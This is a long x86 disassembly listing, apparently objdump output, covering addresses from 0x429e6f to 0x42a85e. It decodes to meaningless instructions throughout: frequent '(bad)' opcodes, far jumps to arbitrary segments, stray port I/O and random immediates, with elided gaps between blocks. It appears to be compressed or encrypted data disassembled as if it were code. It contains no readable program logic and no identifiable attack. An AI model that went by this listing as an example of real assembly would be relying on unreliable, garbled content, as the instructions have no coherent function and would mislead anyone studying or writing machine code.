  429e6f:	(bad)  
  429e70:	in     eax,dx
  429e71:	and    al,0x2d
  429e73:	jmp    0x4808ed58
  429e78:	pop    edi
  429e79:	pop    edx
  429e7a:	add    al,0x6c
  429e7c:	jmp    0xfe69:0x6c70a4ec
  429e83:	pop    ebp
  429e84:	pop    ecx
  429e85:	arpl   WORD PTR [edx],cx
  429e87:	scas   al,BYTE PTR es:[edi]
  429e88:	cli    
  429e89:	ror    DWORD PTR [ebx],1
  429e8b:	and    al,0x27
  429e8d:	dec    eax
  429e8e:	arpl   bp,cx
  429e90:	stos   BYTE PTR es:[edi],al
  429e91:	call   0xf92a:0xbe7c535a
  429e98:	shl    DWORD PTR [ebp-0x45],0xee
  429e9c:	adc    al,0xd0
  429e9e:	pop    es
  429e9f:	sub    DWORD PTR [edx],ebp
  429ea1:	arpl   WORD PTR [edi+0x1b36b8a8],ax
  429ea7:	cs pop eax
  429ea9:	lods   eax,DWORD PTR ds:[esi]
  429eaa:	aad    0xc
  429eac:	lahf   
  429ead:	sbb    al,0x47
  429eaf:	adc    BYTE PTR [ebx-0x482084],dl
  429eb5:	mov    ebx,0x79012907
  429eba:	fild   DWORD PTR [ecx+0x6ec077a1]
  429ec0:	out    0x52,eax
  429ec2:	pop    ebp
  429ec3:	add    ebp,DWORD PTR [ebx+0x5]
  429ec6:	lds    ebx,FWORD PTR [ecx+0x2901639f]
  429ecc:	out    dx,eax
  429ecd:	pop    edx
  429ece:	inc    esi
  429ecf:	outs   dx,BYTE PTR ds:[esi]
  429ed0:	sbb    al,0x2e
  429ed2:	cmp    cl,bh
  429ed4:	add    al,0x61
  429ed6:	jle    0x429ee2
  429ed8:	in     eax,dx
  429ed9:	clc    
  429eda:	dec    ecx
  429edb:	sbb    bh,cl
  429edd:	xor    bh,ah
  429edf:	add    eax,0xbaae3a0e
  429ee4:	adc    dh,bl
  429ee6:	xchg   edx,eax
  429ee7:	mov    edi,0xe0631e60
  429eec:	fwait
  429eed:	mov    edi,DWORD PTR [edx+edi*1-0x174ed040]
  429ef4:	push   esp
  429ef5:	mov    ecx,0x82929bf4
  429efa:	dec    ebx
  429efb:	les    ebp,FWORD PTR [ecx]
  429efd:	adc    ebx,DWORD PTR [edx-0x80]
  429f00:	sbb    bh,ah
  429f02:	xor    ah,ch
  429f04:	jge    0x429f79
  429f06:	push   esp
  429f07:	loop   0x429ea8
  429f09:	pop    esp
  429f0a:	mov    esi,DWORD PTR [ebp+0x49f42a0c]
  429f10:	into   
  429f11:	js     0x429f22
  429f13:	call   0x6cc83bee
  429f18:	jg     0x429f91
  429f1a:	pop    ebp
  429f1b:	sbb    dh,bh
  429f1d:	inc    edi
  429f1e:	sbb    eax,0x995a426d
  429f23:	cwde   
  429f24:	xor    DWORD PTR [ebx],ebp
  429f26:	push   edi
  429f27:	sbb    ah,BYTE PTR [ebx-0x38]
  429f2a:	fcomp  QWORD PTR [edi+edi*4]
  429f2d:	psrad  mm0,mm0
  429f30:	push   es
  429f31:	push   esp
  429f32:	xor    al,0x11
  429f34:	jno    0x429f86
  429f36:	xor    eax,0xbb4a2f17
  429f3b:	icebp  
  429f3c:	dec    eax
  429f3d:	mov    ah,0x94
  429f3f:	aad    0x66
  429f41:	inc    eax
  429f42:	das    
  429f43:	lock loop 0x429ef6
  429f46:	call   0x828c4286
  429f4b:	adc    esi,DWORD PTR [ebp+0x75]
  429f4e:	or     DWORD PTR [esi+esi*1+0x41],esi
  429f52:	xlat   BYTE PTR ds:[ebx]
  429f53:	and    DWORD PTR [edx+0x2d],0x400e9d13
  429f5a:	jns    0x429faa
  429f5c:	int    0xb5
  429f5e:	arpl   WORD PTR [ecx+0x17],sp
  429f61:	fldenv [esi-0x1ab7e184]
  429f67:	adc    ah,cl
  429f69:	test   al,0x7f
  429f6b:	sti    
  429f6c:	mov    dh,0xfb
	...
  429fd6:	xor    DWORD PTR [ebp-0x38],eax
  429fd9:	push   es
  429fda:	cld    
  429fdb:	(bad)  
  429fdc:	push   DWORD PTR [edi-0x50]
  429fdf:	cld    
  429fe0:	sbb    esp,DWORD PTR [ebx+0x4e2543d6]
  429fe6:	addr16 ret 0x1
  429fea:	add    BYTE PTR [ecx],al
  429fec:	add    BYTE PTR [eax],al
  429fee:	test   eax,0xf912446b
  429ff3:	pop    edi
  429ff4:	and    ebp,DWORD PTR [ebp-0x5b633bc4]
  429ffa:	das    
  429ffb:	xchg   ebp,eax
  429ffc:	jmp    0x4a25:0x7b8e1259
  42a003:	ja     0x42a04d
  42a005:	sbb    ecx,ebp
  42a007:	lods   eax,DWORD PTR ds:[esi]
  42a008:	mov    edi,0x3aac1b96
  42a00d:	or     eax,0xe7003888
  42a012:	xchg   ebx,eax
  42a013:	daa    
  42a014:	fldcw  WORD PTR [ecx]
  42a016:	mov    al,ds:0xe7cc61fc
  42a01b:	lahf   
  42a01c:	mov    esp,0xa5188e8c
  42a021:	scas   eax,DWORD PTR es:[edi]
  42a022:	repz cmp dh,al
  42a025:	aam    0x2d
  42a027:	pop    ebx
  42a028:	xchg   DWORD PTR [ebx+0x11c8b3e7],ecx
  42a02e:	gs xchg esp,eax
  42a030:	mov    cl,0x18
  42a032:	jmp    0x42a053
  42a034:	(bad)  
  42a035:	mov    BYTE PTR [ecx+eax*4],0x43
  42a039:	mov    cl,0x3f
  42a03b:	sub    al,BYTE PTR [esi-0x19]
  42a03e:	aam    0x9e
  42a040:	fld    TBYTE PTR [ebp-0x5caff074]
  42a046:	in     al,0x5a
  42a048:	je     0x42a03c
  42a04a:	sub    eax,0xffffff92
  42a04d:	xor    eax,0x2bf99363
  42a052:	mov    esp,0x1e7178ad
  42a057:	fisttp QWORD PTR ds:0x5f83fe4f
  42a05d:	mov    esp,0x9e55f523
  42a062:	xor    eax,0x7e09d696
  42a067:	push   esp
  42a068:	ss popf 
  42a06a:	fst    QWORD PTR [ecx+0x34f687ca]
  42a070:	in     al,0xfb
  42a072:	mov    eax,0x6560bffc
  42a077:	inc    esi
  42a078:	cli    
  42a079:	mov    eax,0x31384241
  42a07e:	xlat   BYTE PTR gs:[ebx]
  42a080:	inc    edi
  42a081:	lock ds xchg edx,eax
  42a084:	add    DWORD PTR [eiz*2+0x7d0cdaea],eax
  42a08b:	adc    eax,0x3b2b0222
  42a090:	jo     0x42a110
  42a092:	stos   BYTE PTR es:[edi],al
  42a093:	repnz ds pushf 
  42a096:	leave  
  42a097:	sub    esp,DWORD PTR [ecx+0x51]
  42a09a:	xchg   esi,eax
  42a09b:	dec    edi
  42a09c:	clc    
  42a09d:	xchg   ecx,eax
  42a09e:	xor    edx,edi
  42a0a0:	or     eax,0xff85f936
  42a0a5:	dec    ecx
  42a0a6:	enter  0xa980,0xcb
  42a0aa:	add    bl,bl
  42a0ac:	pop    ebx
  42a0ad:	test   al,0x66
  42a0af:	ror    DWORD PTR [ebp-0x429dc95b],1
  42a0b5:	xor    esi,DWORD PTR [ecx+0x41624e20]
  42a0bb:	mov    al,0x53
  42a0bd:	jg     0x42a0a4
  42a0bf:	pop    ss
  42a0c0:	rcr    BYTE PTR [ebx+0x33a20063],cl
  42a0c6:	xchg   DWORD PTR [edx-0x5d],esp
  42a0c9:	aas    
  42a0ca:	das    
  42a0cb:	loope  0x42a11c
  42a0cd:	inc    eax
  42a0ce:	rcr    DWORD PTR [ebx+0x28b7a8b7],0xcc
  42a0d5:	popf   
  42a0d6:	cmp    DWORD PTR [esi],ebp
  42a0d8:	int    0xf8
  42a0da:	and    bl,BYTE PTR [esi-0x58cb9f1b]
  42a0e0:	dec    ebx
  42a0e1:	mov    esi,0x9761131e
  42a0e6:	(bad)  [ebp+0x5ffbc565]
  42a0ec:	retf   
  42a0ed:	jg     0x42a0ef
	...
  42a153:	add    BYTE PTR [eax],al
  42a155:	add    bh,dl
  42a157:	pushf  
  42a158:	shr    BYTE PTR [ebp-0x1000235],0xdb
  42a15f:	call   FWORD PTR [ebx]
  42a161:	(bad)  
  42a162:	mov    ecx,0x67d2ee4d
  42a167:	ret    
  42a168:	add    DWORD PTR [eax],eax
  42a16a:	add    BYTE PTR [ecx],al
  42a16c:	add    BYTE PTR [eax],al
  42a16e:	(bad)  
  42a170:	popa   
  42a171:	fwait
  42a172:	sar    DWORD PTR [edx],0x23
  42a175:	in     eax,0xf2
  42a177:	dec    edx
  42a178:	cmp    BYTE PTR [eax+0x57983db4],ch
  42a17e:	pop    edi
  42a17f:	test   DWORD PTR cs:[edx],0xf58d57a1
  42a186:	pop    ebp
  42a187:	lea    esp,[ecx-0x6d]
  42a18a:	loopne 0x42a12a
  42a18c:	cmc    
  42a18d:	sbb    esi,DWORD PTR ds:0x4c3e4f4
  42a193:	add    edi,ebp
  42a195:	fst    QWORD PTR [ecx+0x28755937]
  42a19b:	push   ebp
  42a19c:	popf   
  42a19d:	and    al,0xbc
  42a19f:	pusha  
  42a1a0:	add    eax,DWORD PTR [eax+ecx*1+0x71]
  42a1a4:	sub    ecx,ebx
  42a1a6:	in     eax,0xae
  42a1a8:	mov    bl,0x5
  42a1aa:	mov    bl,0x1c
  42a1ac:	dec    edi
  42a1ad:	dec    esi
  42a1ae:	mov    edi,0x2891a9d4
  42a1b3:	or     DWORD PTR [eax-0x7dab2884],0x779645bd
  42a1bd:	pop    es
  42a1be:	add    BYTE PTR [edi],0x99
  42a1c1:	sti    
  42a1c2:	(bad)  
  42a1c4:	daa    
  42a1c5:	push   es
  42a1c6:	and    ebp,DWORD PTR [ebx+0x7a]
  42a1c9:	and    eax,0x78d7fa0c
  42a1ce:	(bad)  [ecx]
  42a1d0:	inc    eax
  42a1d1:	xor    eax,0xe33a3819
  42a1d6:	lock mov ds:0xe8273b5c,al
  42a1dc:	pop    edi
  42a1dd:	or     BYTE PTR [edi],ah
  42a1df:	(bad)  [edi]
  42a1e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a1e2:	mov    cl,0x88
  42a1e4:	mov    BYTE PTR [eax-0x5],0xa
  42a1e8:	add    ch,bl
  42a1ea:	inc    ecx
  42a1eb:	cwde   
  42a1ec:	pop    eax
  42a1ed:	fwait
  42a1ee:	push   edi
  42a1ef:	test   eax,0xe5db0680
  42a1f4:	outs   dx,DWORD PTR ds:[esi]
  42a1f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a1f6:	dec    eax
  42a1f7:	inc    edi
  42a1f8:	or     al,0x7a
  42a1fa:	add    DWORD PTR [edx],ecx
  42a1fc:	push   eax
  42a1fd:	ret    0x1309
  42a200:	out    dx,eax
  42a201:	int    0xaf
  42a203:	sub    esi,DWORD PTR [esi]
  42a205:	jl     0x42a208
  42a207:	jne    0x42a1ca
  42a209:	shl    BYTE PTR [edx+0x2b67040e],cl
  42a20f:	rcr    BYTE PTR [edx-0x3e217cd1],cl
  42a215:	(bad)  
  42a217:	das    
  42a218:	push   es
  42a219:	fldz   
  42a21b:	sub    DWORD PTR [esi-0x37],ebx
  42a21e:	sbb    esi,ebp
  42a220:	ins    DWORD PTR es:[edi],dx
  42a221:	lock or esi,DWORD PTR [ecx-0x6e]
  42a225:	adc    DWORD PTR [ebx-0x1ae8fbe5],0x7ebaab58
  42a22f:	jae    0x42a27f
  42a231:	jns    0x42a1ef
  42a233:	jo     0x42a1c4
  42a235:	or     eax,0x189e7f87
  42a23a:	xlat   BYTE PTR ds:[ebx]
  42a23b:	lods   eax,DWORD PTR ds:[esi]
  42a23c:	push   cs
  42a23d:	das    
  42a23e:	lods   al,BYTE PTR ds:[esi]
  42a23f:	leave  
  42a240:	pop    ebx
  42a241:	add    BYTE PTR [ebp+0x7ca94fd1],bl
  42a247:	in     al,dx
  42a248:	fidiv  WORD PTR [ebx-0xf82c0fa]
  42a24e:	enter  0x7e6d,0x47
  42a252:	add    al,0x9a
  42a254:	sbb    ebp,DWORD PTR [esi]
  42a256:	stos   BYTE PTR es:[edi],al
  42a257:	mov    ebp,0x95cadd70
  42a25c:	popa   
  42a25d:	adc    al,0x8c
  42a25f:	adc    eax,0x4edc3073
  42a264:	(bad)  
  42a265:	push   ebx
  42a266:	lea    edx,[ecx+0x6b3de76]
  42a26c:	(bad)  
  42a26d:	test   BYTE PTR [eax],al
	...
  42a2d3:	add    BYTE PTR [eax],al
  42a2d5:	add    BYTE PTR [ebx],ch
  42a2d7:	test   DWORD PTR [ebp-0x50e640e7],edx
  42a2dd:	mov    bh,0x1a
  42a2df:	aas    
  42a2e0:	scas   al,BYTE PTR es:[edi]
  42a2e1:	fstp   DWORD PTR [edi+0x67945ab5]
  42a2e7:	les    eax,FWORD PTR [ecx]
  42a2e9:	add    BYTE PTR [eax],al
  42a2eb:	add    DWORD PTR [eax],eax
  42a2ed:	add    cl,dh
  42a2ef:	cmp    DWORD PTR ds:0x787db9d0,esp
  42a2f5:	scas   eax,DWORD PTR es:[edi]
  42a2f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a2f7:	and    bh,al
  42a2f9:	add    bh,BYTE PTR [edi-0x67dcc31]
  42a2ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a300:	pop    esi
  42a301:	mov    ecx,0x5f65fc1e
  42a306:	sub    DWORD PTR [esi],edx
  42a308:	lods   eax,DWORD PTR ds:[esi]
  42a309:	lds    ebx,FWORD PTR [esp+esi*8]
  42a30c:	cmp    ebp,edx
  42a30e:	xchg   esi,eax
  42a30f:	jns    0x42a2dd
  42a311:	mov    ecx,0x9473cbbd
  42a316:	pop    ebp
  42a317:	aaa    
  42a318:	push   0x2c
  42a31a:	pusha  
  42a31b:	jecxz  0x42a2d0
  42a31d:	icebp  
  42a31e:	and    al,0x29
  42a320:	cmp    eax,0xe8d6a765
  42a325:	xchg   ecx,eax
  42a326:	aad    0x1c
  42a328:	dec    edi
  42a329:	test   eax,0x8d027668
  42a32e:	test   al,0xbd
  42a330:	push   0x49
  42a332:	pop    esi
  42a333:	inc    ecx
  42a334:	jne    0x42a385
  42a336:	add    ebx,DWORD PTR [esi-0x5e52f366]
  42a33c:	pusha  
  42a33d:	packssdw mm1,QWORD PTR [edi+esi*4-0x3b23ed15]
  42a345:	(bad)  
  42a346:	lock push es
  42a348:	jmp    0x5848:0x2bd7542
  42a34f:	xchg   DWORD PTR [edi-0x725ea88a],ebp
  42a355:	push   0xd4343dd9
  42a35a:	inc    edi
  42a35b:	test   BYTE PTR [edx],ah
  42a35d:	in     al,0xaa
  42a35f:	jbe    0x42a3c3
  42a361:	adc    al,0xcc
  42a363:	and    BYTE PTR [esi-0x25],cl
  42a366:	cdq    
  42a367:	xor    ecx,edx
  42a369:	jg     0x42a349
  42a36b:	jbe    0x42a2fe
  42a36d:	test   eax,ebp
  42a36f:	retf   
  42a370:	adc    ch,BYTE PTR [esi-0x4b]
  42a373:	mov    ?,WORD PTR [ecx-0x1fae3a62]
  42a379:	inc    edx
  42a37a:	adc    eax,0x9308328
  42a37f:	mov    ah,BYTE PTR [edx]
  42a381:	mov    WORD PTR ds:0x4f63ef92,cs
  42a387:	aas    
  42a388:	cmp    bh,al
  42a38a:	fld    TBYTE PTR [ecx]
  42a38c:	jg     0x42a372
  42a38e:	aaa    
  42a38f:	arpl   WORD PTR [esi+0x2e],bx
  42a392:	and    esp,DWORD PTR [esi]
  42a394:	je     0x42a3cd
  42a396:	jnp    0x42a40e
  42a398:	jecxz  0x42a3f4
  42a39a:	imul   DWORD PTR ds:0xcf8404db
  42a3a0:	xchg   ch,cl
  42a3a2:	imul   ebx,DWORD PTR [edx-0x5dfc4542],0x1e
  42a3a9:	sbb    ebp,0xffffffa3
  42a3ac:	nop
  42a3ad:	popa   
  42a3ae:	xchg   ebx,eax
  42a3af:	lahf   
  42a3b0:	ja     0x42a360
  42a3b2:	mov    al,BYTE PTR [eax+0x61]
  42a3b5:	retf   
  42a3b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a3b7:	pop    esi
  42a3b8:	jmp    0x4de:0x918fe205
  42a3bf:	(bad)  
  42a3c0:	repnz add DWORD PTR [edx],0x74371008
  42a3c7:	jmp    0x3646:0xe23fa439
  42a3ce:	jnp    0x42a38b
  42a3d0:	pop    ds
  42a3d1:	dec    edx
  42a3d2:	jecxz  0x42a419
  42a3d4:	nop
  42a3d5:	mov    DWORD PTR [edi-0x6f],edx
  42a3d8:	sahf   
  42a3d9:	imul   edx,edi,0x6d
  42a3dc:	je     0x42a385
  42a3de:	imul   edi,DWORD PTR [ebp-0x4a1fcce4],0x8397f0a2
  42a3e8:	dec    ebp
  42a3e9:	jmp    0x0:0x6812f4c8
	...
  42a454:	add    BYTE PTR [eax],al
  42a456:	jg     0x42a466
  42a458:	jne    0x42a495
  42a45a:	jne    0x42a4d7
  42a45c:	jg     0x42a4ac
  42a45e:	loop   0x42a4c9
  42a460:	mov    ebp,0x4ae64e3d
  42a465:	retf   0xc567
  42a468:	add    DWORD PTR [eax],eax
  42a46a:	add    BYTE PTR [ecx],al
  42a46c:	add    BYTE PTR [eax],al
  42a46e:	ds (bad) 
  42a470:	jb     0x42a472
  42a472:	fisttp WORD PTR [edi+0x63]
  42a475:	jae    0x42a4c0
  42a477:	(bad)  
  42a479:	adc    DWORD PTR [ebp-0x2b],eax
  42a47c:	xchg   edi,eax
  42a47d:	leave  
  42a47e:	popa   
  42a47f:	in     eax,dx
  42a480:	or     DWORD PTR [ebp+0x5c414db],0x4
  42a487:	or     DWORD PTR [edx+ebp*8+0x18],ecx
  42a48b:	mov    ah,0xed
  42a48d:	not    BYTE PTR [ebp+0x5e8ac98c]
  42a493:	in     al,dx
  42a494:	mov    al,ds:0xf6c1a9e6
  42a499:	(bad)  
  42a49a:	mov    ds:0xcef12640,al
  42a49f:	mov    dh,0xaa
  42a4a1:	rcl    BYTE PTR [ecx-0x52],cl
  42a4a4:	xor    BYTE PTR [eax],0x85
  42a4a7:	jb     0x42a44c
  42a4a9:	add    al,0xaa
  42a4ab:	push   ecx
  42a4ac:	cli    
  42a4ad:	or     al,0x7c
  42a4af:	sub    DWORD PTR [edi-0x67ef9ca],ebx
  42a4b5:	mov    edi,0x5087946a
  42a4ba:	les    esi,FWORD PTR [ebp-0x6abf4969]
  42a4c0:	mov    BYTE PTR ds:0x6a9f4659,cl
  42a4c6:	popf   
  42a4c7:	ret    
  42a4c8:	call   0x185dea84
  42a4cd:	cmp    DWORD PTR [esi+0x19],edx
  42a4d0:	adc    BYTE PTR [ebx+esi*4],bl
  42a4d3:	popf   
  42a4d4:	aaa    
  42a4d5:	dec    edi
  42a4d6:	sar    DWORD PTR [edi-0x1a9254ee],cl
  42a4dc:	daa    
  42a4dd:	sbb    eax,0xe381762b
  42a4e2:	out    dx,al
  42a4e3:	push   ebp
  42a4e4:	add    ch,BYTE PTR [edi+0x30]
  42a4e7:	in     al,0x68
  42a4e9:	nop
  42a4ea:	inc    ebx
  42a4eb:	push   DWORD PTR [edi-0xe]
  42a4ee:	cmp    BYTE PTR [esi+0x7dd314e0],dl
  42a4f4:	cli    
  42a4f5:	adc    BYTE PTR [esi-0x260726d9],cl
  42a4fb:	push   esi
  42a4fc:	test   BYTE PTR [ecx+edi*1+0x507f6088],ah
  42a503:	jns    0x42a556
  42a505:	cmc    
  42a506:	ins    BYTE PTR es:[edi],dx
  42a507:	inc    DWORD PTR [ecx-0x34]
  42a50a:	(bad)
  42a50e:	call   FWORD PTR [eax]
  42a510:	adc    bl,BYTE PTR [ebp-0x4e6ae034]
  42a516:	pop    edx
  42a517:	test   eax,0x7d862a1
  42a51c:	ds pushf 
  42a51e:	sar    cl,1
  42a520:	(bad)  
  42a521:	jne    0x42a4b8
  42a523:	or     edx,DWORD PTR [eax]
  42a525:	push   ebx
  42a526:	stos   DWORD PTR es:[edi],eax
  42a527:	ins    DWORD PTR es:[edi],dx
  42a528:	test   al,0xd1
  42a52a:	sbb    eax,DWORD PTR [ecx]
  42a52c:	mov    ecx,0x64a37f3c
  42a531:	mov    dl,0xf1
  42a533:	mov    WORD PTR [edx],cs
  42a535:	setns  BYTE PTR [ebp-0x678f5153]
  42a53c:	fstp   TBYTE PTR [ebx+0x60]
  42a53f:	(bad)  
  42a540:	jae    0x42a536
  42a542:	push   eax
  42a543:	out    0x12,eax
  42a545:	int3   
  42a546:	pop    es
  42a547:	addr16 in eax,0xbd
  42a54a:	xchg   ebp,eax
  42a54b:	sar    DWORD PTR [esi+0x62971344],0x30
  42a552:	mov    bl,0xa9
  42a554:	or     al,0x52
  42a556:	gs inc esp
  42a558:	push   ecx
  42a559:	sub    ah,bh
  42a55b:	jmp    0xb7c1:0xd97c1dd8
  42a562:	mov    edx,DWORD PTR [eax]
  42a564:	cmp    al,BYTE PTR [eax+ecx*1]
  42a567:	mov    esp,0xacc017d6
  42a56c:	add    BYTE PTR [ebx+0x0],dh
	...
  42a5d6:	sbb    BYTE PTR [edi+0x17],cl
  42a5d9:	mov    ecx,0xefbef957
  42a5de:	(bad)  
  42a5df:	cmc    
  42a5e0:	mov    edx,0x8cc9d59f
  42a5e5:	or     BYTE PTR [edi-0x3a],ah
  42a5e8:	add    DWORD PTR [eax],eax
  42a5ea:	add    BYTE PTR [ecx],al
  42a5ec:	add    BYTE PTR [eax],al
  42a5ee:	leave  
  42a5ef:	outs   dx,BYTE PTR ds:[esi]
  42a5f0:	jmp    0xfdb2:0x9a727640
  42a5f7:	rcl    BYTE PTR [esi-0x7b],1
  42a5fa:	mov    esi,0xb4724d56
  42a5ff:	inc    ecx
  42a600:	mov    edi,0xc881996d
  42a605:	mov    bh,0x5b
  42a607:	mov    eax,0x223672a7
  42a60c:	jg     0x42a5d6
  42a60e:	call   0x950:0xf526f837
  42a615:	jge    0x42a637
  42a617:	les    ebp,FWORD PTR [esi]
  42a619:	inc    ebp
  42a61a:	jmp    0xa9fb:0x39a2f157
  42a621:	xchg   ebx,eax
  42a622:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a623:	xchg   ebx,eax
  42a624:	and    ah,BYTE PTR es:[eax+0x1c]
  42a628:	pmaddwd mm5,QWORD PTR [ebx]
  42a62b:	inc    ch
  42a62d:	and    eax,0x84a2375d
  42a632:	cmp    al,BYTE PTR [ecx]
  42a634:	ins    DWORD PTR es:[edi],dx
  42a635:	pop    edx
  42a636:	mov    ds:0x156108b0,eax
  42a63b:	rcr    edx,0xaa
  42a63e:	or     al,0x54
  42a640:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a641:	push   0x1d599ae2
  42a646:	xor    BYTE PTR [esi],dl
  42a648:	outs   dx,BYTE PTR ds:[esi]
  42a649:	(bad)  
  42a64a:	fist   WORD PTR [edx+0x10]
  42a64d:	xchg   DWORD PTR [esp+edi*1],edx
  42a650:	dec    ebp
  42a651:	aaa    
  42a652:	addr16 inc esi
  42a654:	pop    ebx
  42a655:	out    dx,al
  42a656:	jae    0x42a60c
  42a658:	sti    
  42a659:	pop    edx
  42a65a:	ja     0x42a67b
  42a65c:	and    ah,BYTE PTR [ebx-0x153db5d]
  42a662:	das    
  42a663:	mov    ds:0x7d38bab0,al
  42a668:	push   edx
  42a669:	or     eax,0xdd67df1a
  42a66e:	jbe    0x42a66a
  42a670:	mov    ecx,ebp
  42a672:	pop    ecx
  42a673:	pop    ss
  42a674:	mov    esi,0x40bfc829
  42a679:	mov    cl,0x28
  42a67b:	ss sar eax,1
  42a67e:	pop    ds
  42a67f:	jbe    0x42a660
  42a681:	mov    dh,0xfe
  42a683:	pop    ecx
  42a684:	iret   
  42a685:	pusha  
  42a686:	sbb    edi,DWORD PTR [ebx+0x7]
  42a689:	pop    es
  42a68a:	push   cs
  42a68b:	fild   DWORD PTR [edx]
  42a68d:	mov    esp,0x159afd87
  42a692:	dec    eax
  42a693:	clc    
  42a694:	fstp   DWORD PTR [ecx-0x23b07a0e]
  42a69a:	mov    eax,ds:0xcedab070
  42a69f:	retf   0x8744
  42a6a2:	cmp    ax,0x663f
  42a6a6:	or     al,0xd8
  42a6a8:	push   ss
  42a6a9:	mov    bl,0xcf
  42a6ab:	and    esi,edx
  42a6ad:	dec    eax
  42a6ae:	cdq    
  42a6af:	sbb    al,0x4e
  42a6b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a6b2:	call   0xa7fce2c8
  42a6b7:	pop    eax
  42a6b8:	daa    
  42a6b9:	mov    cl,0xa8
  42a6bb:	ss (bad) 
  42a6bd:	faddp  st(1),st
  42a6bf:	jns    0x42a730
  42a6c1:	xchg   esi,eax
  42a6c2:	jbe    0x42a699
  42a6c4:	pop    ecx
  42a6c5:	(bad)  
  42a6c6:	jle    0x42a6ca
  42a6c8:	cdq    
  42a6c9:	and    eax,0xcc639022
  42a6ce:	repnz test al,0xaa
  42a6d1:	dec    esp
  42a6d2:	dec    edx
  42a6d3:	fs popf 
  42a6d5:	push   cs
  42a6d6:	das    
  42a6d7:	xchg   edx,esi
  42a6d9:	sbb    eax,0x17fece6e
  42a6de:	scas   eax,DWORD PTR es:[edi]
  42a6df:	push   eax
  42a6e0:	jo     0x42a760
  42a6e2:	adc    bl,BYTE PTR [edx-0x13]
  42a6e5:	sbb    al,0xdf
  42a6e7:	xor    ch,BYTE PTR [edi-0x26]
  42a6ea:	std    
  42a6eb:	sub    DWORD PTR [esp+ebx*2+0x0],ebp
	...
  42a756:	and    al,0x16
  42a758:	outs   dx,BYTE PTR ds:[esi]
  42a759:	(bad)  
  42a75a:	jle    0x42a75b
  42a75c:	lods   eax,DWORD PTR ds:[esi]
  42a75d:	test   DWORD PTR [edi-0x347ece4],0x676bb07d
  42a767:	mov    DWORD PTR [ecx],0x10000
  42a76d:	add    BYTE PTR [edi+esi*1+0x303bbce5],dh
  42a774:	dec    esi
  42a775:	daa    
  42a776:	fwait
  42a777:	out    dx,al
  42a778:	mov    ds:0xfea35a88,eax
  42a77d:	bound  ecx,QWORD PTR [edx]
  42a77f:	imul   ebx,DWORD PTR [edi-0x1d99958],0x3
  42a786:	dec    edx
  42a787:	and    DWORD PTR [bp+di-0x4084],edx
  42a78c:	jmp    0x2455:0x44c19489
  42a793:	sbb    BYTE PTR ds:[ebx],ch
  42a796:	xchg   esi,eax
  42a797:	mov    BYTE PTR [ecx-0x3bf5c3d5],bh
  42a79d:	xchg   ebp,eax
  42a79e:	or     al,0xe7
  42a7a0:	mov    edx,DWORD PTR [esi-0x52]
  42a7a3:	scas   al,BYTE PTR es:[edi]
  42a7a4:	leave  
  42a7a5:	mov    al,ds:0x5f7da97d
  42a7aa:	dec    ebx
  42a7ab:	jb     0x42a808
  42a7ad:	rcl    DWORD PTR ds:0xc6ea9d50,cl
  42a7b3:	and    DWORD PTR [esi+0x760c0ac4],ebx
  42a7b9:	or     ebp,DWORD PTR [esp+eax*4+0x1d]
  42a7bd:	pop    esp
  42a7be:	sahf   
  42a7bf:	iret   
  42a7c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a7c1:	jmp    FWORD PTR [ebx+0x40]
  42a7c4:	inc    edx
  42a7c5:	aaa    
  42a7c6:	inc    ebp
  42a7c7:	mov    al,0x25
  42a7c9:	mov    al,0xec
  42a7cb:	imul   ebp,DWORD PTR [esi-0x193a7acd],0xffffffd8
  42a7d2:	ins    BYTE PTR es:[edi],dx
  42a7d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a7d4:	mov    DWORD PTR [ebx-0x2c],esi
  42a7d7:	adc    ecx,esp
  42a7d9:	dec    esp
  42a7da:	inc    ebx
  42a7db:	fst    DWORD PTR [ebx+eax*8-0x57]
  42a7df:	xor    BYTE PTR [ecx+0x4b],bl
  42a7e2:	cmp    cl,ch
  42a7e4:	mov    ah,0xc1
  42a7e6:	adc    edx,DWORD PTR [edi]
  42a7e8:	cmp    eax,DWORD PTR ds:0xcd7172d2
  42a7ee:	dec    edx
  42a7ef:	adc    BYTE PTR [edi-0x5882321f],dh
  42a7f5:	scas   eax,DWORD PTR es:[edi]
  42a7f6:	popa   
  42a7f7:	nop
  42a7f8:	adc    eax,0xec616af1
  42a7fd:	push   WORD PTR [ecx-0x34862429]
  42a804:	mov    edi,DWORD PTR [eax]
  42a806:	and    esi,edx
  42a808:	minps  xmm0,xmm0
  42a80b:	pop    edi
  42a80c:	lods   eax,DWORD PTR ds:[esi]
  42a80d:	sahf   
  42a80e:	stos   BYTE PTR es:[edi],al
  42a80f:	sti    
  42a810:	adc    di,WORD PTR [ebp+0x51]
  42a814:	mov    DWORD PTR [edx],edx
  42a816:	scas   al,BYTE PTR es:[edi]
  42a817:	or     esp,ebx
  42a819:	dec    edx
  42a81a:	sub    eax,0xcf85b61c
  42a81f:	in     al,0x6a
  42a821:	or     al,0x30
  42a823:	push   edx
  42a824:	mov    gs,WORD PTR [ebx-0xf]
  42a827:	pop    ds
  42a828:	in     al,0xba
  42a82a:	into   
  42a82b:	(bad)  
  42a82c:	xor    eax,0x3b195dd7
  42a831:	lahf   
  42a832:	in     al,dx
  42a833:	neg    BYTE PTR [edi+0x5509194a]
  42a839:	addr16 sti 
  42a83b:	arpl   sp,dx
  42a83d:	jle    0x42a819
  42a83f:	test   BYTE PTR [edi-0x9bcd753],al
  42a845:	js     0x42a7ce
  42a847:	sub    al,0xa3
  42a849:	fmul   QWORD PTR [esi]
  42a84b:	xor    ah,al
  42a84d:	popf   
  42a84e:	int3   
  42a84f:	(bad)  
  42a850:	out    0xce,eax
  42a852:	ins    BYTE PTR es:[edi],dx
  42a853:	popa   
  42a854:	push   esp
  42a855:	loope  0x42a7d8
  42a857:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a858:	loopne 0x42a85a
  42a85a:	jmp    0x42a800
  42a85c:	cmp    esi,edx
  42a85e:	lea    edx,[edx-0x5a]
